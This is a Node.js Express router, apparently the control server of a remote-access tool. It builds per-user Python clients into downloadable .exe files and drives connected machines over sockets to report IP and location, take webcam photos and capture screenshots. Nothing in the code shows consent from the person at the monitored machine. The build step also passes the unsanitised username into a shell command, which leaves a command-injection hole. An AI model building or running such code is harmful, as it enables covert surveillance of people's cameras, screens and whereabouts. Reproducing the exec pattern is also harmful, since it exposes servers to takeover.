var express = require('express');
var router = express.Router();
var path = require('path');
var User = require('../models/user');
var Device = require('../models/device');
var bcrypt = require('bcrypt');
var fs = require('fs');
var mkdirp = require('mkdirp');
var AdmZip = require('adm-zip');
const util = require('util');
const exec = util.promisify(require('child_process').exec);
//const readFile = util.promisify(fs.readFile);
//const writeFile = util.promisify(fs.writeFile);
const saltRounds = 12;
const template = path.join(__dirname + '/../client_files/client_template.py');

function guid() {
    function s4() {
        return Math.floor((1 + Math.random()) * 0x10000)
    }
    return s4() + s4() + s4() + s4() + s4();
}

function zip_exe(zip_path, exe_path) {
    return new Promise(function(res, rej) {
        var zip = new AdmZip();

        zip.addLocalFile(exe_path);

        // write it to disk
        zip.writeZip(zip_path, function(err) {
            if(err) { 
                rej(err);
                return;
            }
            else {
                console.log('done zipping');
                res();
                return;
            }
        }); 
    });
}


async function generate_exe(username, deviceId, output_dir) {
    const {err, stdout, stderr} 
        = await exec('pyinstaller --onefile '+username+deviceId+'.py', {
            cwd: output_dir
        });
}

function copy_file(source, dest) {
    return new Promise(function(res, rej) {
        var readStream = fs.createReadStream(source);
    
        readStream.once('error', (err) => {
            rej(err);
            return;
        });
        
        readStream.once('end', () => {});
        
        readStream.pipe(fs.createWriteStream(dest));
        
        console.log('done copying');
        res();
    });
}

function edit_python_template(device_id, username) {
    
    return new Promise(function(res, rej) {
        var client_file = path.join(__dirname + '/../client_files/'+username+device_id+'/'+username+device_id+'.py');
        
        
        fs.readFile(client_file, 'utf8', function(err, data) {
            if(err) {  
                rej(err);
                return;
            }
            
            var result = data.replace('TEMPAPPID', username);
            
            result = result.replace('TEMPDEVICEID', device_id);
            
            fs.writeFile(client_file, result, 'utf8', function(err) {
                if(err) {  
                    rej(err);
                    return;
                }
                else {
                    setTimeout(function() {
                        console.log('done editing');
                        res();
                    }, 2500);
                }
            });
        });
    });
}

// GET route for reading data 
router.get('/', function (req, res, next) {
	return res.render(path.join(__dirname + '/../frontend/index'));
});

// POST route for updating data 
router.post('/', function (req, res, next) {
	
	if (req.body.username && req.body.password && req.body.passwordConf) {
        var promise = createUserPromise(req);
        
        promise.then(function (user) {
            req.session.userId = user._id;
            return res.redirect('/mainMenu');

        }).catch(function(err) {
            console.log(err);
            return next(err);
        });
		
	} else if (req.body.logUser && req.body.logPass) {
		User.authenticate(req.body.logUser, req.body.logPass, function (error, user) {
			if (error || !user) {
				const err = new Error('Wrong username or password.');
				err.status = 401;
				return next(err);
			} else {
                req.session.userId = user._id;
                return res.redirect('/mainMenu');                    
            }        
		});
        
	} else {
		const err = new Error('All fields required.');
		err.status = 400;
		return next(err);
	}
});


// GET route after registering or logging in
router.get('/mainMenu', function (req, res, next) {
	User.findById(req.session.userId).exec(function (error, user) {
		if (error) {
			return next(error);
		} else {
            setTimeout(function() {
                if (user == null) {
                    const err = new Error('Not authorized.');
                    err.status = 401;
                    return next(err);
                } else {                
                    Device.find({appId: user.appId}).exec(function(err,device_results) {
                        if(err) { return next(err); }
                        return res.render(path.join(__dirname + '/../frontend/mainMenu'), {
                            devices: device_results,
                            user: user
                        });
                    });
                }
            }, 1500);
		}
	});
});

// GET route to bring user to client download page 
router.get('/download', function (req, res, next) {
    User.findById(req.session.userId).exec(function (error, user) {
		if (error) {
			return next(error);
		} else {
			if (user == null) {
				const err = new Error('Not authorized.');
				err.status = 401;
				return next(err);
			} else {             
                return res.render(path.join(__dirname + '/../frontend/download'), {
                    user: user
                });
			}
		}
	});
});

// POST route to take in device name and compile an executable client 
router.post('/download', function (req, res, next) {
    User.findById(req.session.userId).exec(function (error, user) {
		if (error) {
			return next(error);
		} else {	
            res.connection.setTimeout(0);
            
            var newDeviceId = guid();
            var deviceName = req.body.deviceName;
            var client_folder = path.join(__dirname + '/../client_files/'+user.username+newDeviceId);

            var deviceData = {
                appId: user.appId,
                deviceId: newDeviceId,
                name: deviceName,
                socketId: ''
            };  
            
            
            
            var client_folder = path.join(__dirname + '/../client_files/'+user.username+newDeviceId);
            mkdirp(client_folder, function(err) {
                if(err) { return next(err); }
                else {                            
                
                    var client_file = client_folder+'/'+user.username+newDeviceId+'.py';
                    
                    console.log('Copying template...');
                    
                    copy_file(template, client_file)
                    .then(function() {
                        
                        console.log('Editing python file...');

                        edit_python_template(newDeviceId, user.username)
                        .then(function() {
                            
                            console.log('Generating exe...');
                            
                            generate_exe(user.username, newDeviceId, client_folder)
                            .then(function() {
                                console.log('Zipping exe...');
                                
                                zip_exe(client_folder+'/exe.zip', client_folder+'/dist/'+user.username+newDeviceId+'.exe')
                                .then(function() {
                                    Device.create(deviceData, function(error, device) {
                                        if(error) { return next(error); }
                                        
                                        //TODO: Dont allow any usernames outside a-zA-Z0-9
                                        
                                        else {
                                            res.download(client_folder+'/exe.zip', user.username+deviceName+'.zip', function(err) {
                                                if(err) { return next(err); }
                                                else { 
                                                    res.end();
                                                    return;
                                                }
                                            }); 
                                        }
                                    });
                                }).catch(function(err) {
                                    return next(err);
                                });
                            }).catch(function(err) {
                               return next(err); 
                            });
                        }).catch(function(err) {
                            return next(err);
                        });
                    }).catch(function(err) {
                        return next(err);
                    });                    
                }
            });                         
        }		
	});
});

function createUserPromise(req) {
    return new Promise(function (res, rej) {
        var userData = {
			username: req.body.username,
			password: req.body.password,
            appId: ''
		}
		
        bcrypt.genSalt(saltRounds, function(err, salt) {
            bcrypt.hash(userData.password, salt, function (err, hash) {
                if (err) {
                    rej(err);
                }
                userData.password = hash;
                
                bcrypt.genSalt(saltRounds, function(err, salt) {

                    bcrypt.hash(userData.username, salt, function (err, hash) {
                        if (err) { rej(err); }
                        else { 
                            userData.appId = hash;
                            
                            User.create(userData, function (error, user) {
                                if (error) {
                                    rej(error);
                                } else {
                                    res(user);
                                }
                            });
                        
                        }
                    });
                });
                
            }); 
        });
    });
}

function createSocketPromise(socket, command) {
    return new Promise(function (res, rej) {
        socket.once(command, function(data) {
            if(!data) { 
                const err = new Error('Socket error');
                rej(err); 
            } else if(data.data == 'OS not supported.') {
                rej(data);
            } else {
                res(data);
            } 
        });
    });
}


// GET route to bring user to device dashboard
router.get('/dashboard', function (req, res, next) {  
    User.findById(req.session.userId).exec(function (error, user) {
		if (error) {
			return next(error);
		} else {
			if (user == null) {
				const err = new Error('Not authorized.');
				err.status = 401;
				return next(err);
			} else {    
                var sockets = req.app.io.nsps['/'].adapter.rooms;
                var socket_client;

                for (sid in sockets) {
                    if (sid == req.query.socket) {
                        socket_client = req.app.io.sockets.connected[sid];
                        break;
                    }
                }
                
                if(socket_client == undefined) {
                    return res.redirect('/mainMenu');
                }
                
                req.app.io.to(req.query.socket).emit('get_ip_info', '');
                
                var promise = createSocketPromise(socket_client, 'send_ip_info');
                                
                promise.then(function (result) {
                    Device.findOne({appId: req.query.appId, deviceId: req.query.deviceId}).exec(function (error, device) {
                        if(error) { return next(error); }
                        else {
                            if(device == null) {
                                const err = new Error('Device not found!');
                                console.log(err.message);
                                return next(err);
                            }
                            var client_ip = result.data.ip;
                            var client_org = result.data.org;
                            var client_city = result.data.city;
                            var client_country = result.data.country;
                            var client_region = result.data.region;
                            var client_loc = result.data.loc;
                             
                        
                            res.render(path.join(__dirname + '/../frontend/dashboard'), {
                                user: user,
                                ip: client_ip,
                                org: client_org,
                                city: client_city,
                                country: client_country,
                                region: client_region,
                                loc: client_loc,
                                socket: req.query.socket,
                                device: device
                            });
                        }
                    });
                }).catch(function(err) {
                    console.log(err);
                    return res.redirect('/mainMenu');
                });
                                   
			}
		}
	});
});

router.get('/capture_webcam', function(req, res, next) {

    User.findById(req.session.userId).exec(function (error, user) {
		if (error) {
			return next(error);
		} else {
			if (user == null) {
				const err = new Error('Not authorized.');
				err.status = 401;
				return next(err);
			} else {                
                Device.findOne({appId: user.appId, socketId: req.query.socket}).exec(function (error, device) {
                    if(error) {
                        console.log(error);
                        return next(error);
                        
                    } else {
                        if(device == null) {
                            const err = new Error('Device not found!');
                            console.log(err.message);
                            return next(err);
                            
                        }
                        
                        console.log("Capturing webcam photo");
                        var sockets = req.app.io.nsps['/'].adapter.rooms;
                        var socket_client;

                        for (sid in sockets) {
                            if (sid == device.socketId) {
                                socket_client = req.app.io.sockets.connected[sid];    
                                break;
                            }
                        }
                        
                        if(socket_client == undefined) {
                            return res.redirect('/mainMenu');
                        }
                        
                        req.app.io.to(device.socketId).emit('take_webcam_picture', '');

                        var promise = createSocketPromise(socket_client, 'send_webcam_picture');
                        
                        promise.then(function (result) {                            
                            device.webcam.data = result.buffer;
                            device.webcam.contentType = 'image/jpg';
                            
                            device.save(function (err, device) {
                                if(err) { return next(err); }
                                else {
                                    return res.redirect('back');
                                }
                            });
                            
                            /* fs.writeFile(__dirname + '/../frontend/uploads/webcam.jpg', result.buffer, 'base64', function(err) {
                                if(err){
                                    const err = new Error('Socket error');
                                    return next(err);     
                                }
                                else {
                                    return res.redirect('back');
                                }
                            }); */
                        }).catch(function(err) {
                            console.log(err);
                            return res.redirect('/mainMenu');
                        });   
                    }
                });
			}
		}
	});
});


router.get('/capture_screenshot', function(req, res, next) {

    User.findById(req.session.userId).exec(function (error, user) {
		if (error) {
			return next(error);
		} else {
			if (user == null) {
				const err = new Error('Not authorized.');
				err.status = 401;
				return next(err);
			} else {                
                Device.findOne({appId: user.appId, socketId: req.query.socket}).exec(function (error, device) {
                    if(error) {
                        console.log(error);
                        return next(error);
                        
                    } else {
                        if(device == null) {
                            const err = new Error('Device not found!');
                            console.log(err.message);
                            return next(err);
                            
                        }
            
                        console.log("Taking screenshot");
                        var sockets = req.app.io.nsps['/'].adapter.rooms;
                        var socket_client;

                        for (sid in sockets) {
                            if (sid == device.socketId) {
                                socket_client = req.app.io.sockets.connected[sid];    
                                break;
                            }
                        }
                        
                        if(socket_client == undefined) {
                            return res.redirect('/mainMenu');
                        }

                        req.app.io.to(device.socketId).emit('take_screenshot', '');
                        
                        var promise = createSocketPromise(socket_client, 'send_screenshot');
                        
                        promise.then(function (result) {
                            
                            device.screenshot.data = result.buffer;
                            device.screenshot.contentType = 'image/jpg';
                            
                            device.save(function (err, device) {
                                if(err) { return next(err); }
                                else {
                                    return res.redirect('back');
                                }
                            });
                            
                            /* fs.writeFile(__dirname + '/../frontend/uploads/screenshot.jpg', result.buffer, 'base64', function(err) {
                                if(err){
                                    const err = new Error('Socket error');
                                    return next(err);     
                                }
                                else {
                                    return res.redirect('back');
                                }
                            }); */
                        }).catch(function(err) {
                            console.log(err);
                            return res.redirect('/mainMenu');
                        });
                    }
                });
			}
		}
	});
});

// GET for logout 
router.get('/logout', function (req, res, next) {
    if (req.session) {
		// delete session object
		req.session.destroy(function (err) {
			if (err) {
				return next(err);
			} else {
				return res.redirect('/');
			}
		});
	}
});



module.exports = router;